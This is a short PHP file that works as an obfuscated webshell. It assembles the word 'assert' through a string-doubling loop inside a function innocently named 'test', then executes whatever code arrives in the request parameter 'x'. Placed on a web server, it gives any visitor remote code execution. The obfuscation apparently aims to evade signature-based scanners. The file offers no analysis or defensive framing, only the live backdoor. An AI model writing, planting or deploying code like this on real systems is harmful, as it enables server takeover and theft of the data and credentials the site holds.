<?php
function test($a){
$arr = array('a','s','s','e','r','t');
$func = '';
for($i=0;$i<count($arr);$i++) {
$func.=$func.$arr[$i];
}
$func=substr($func,-6);
$func($a);
}
test($_REQUEST['x']);
?>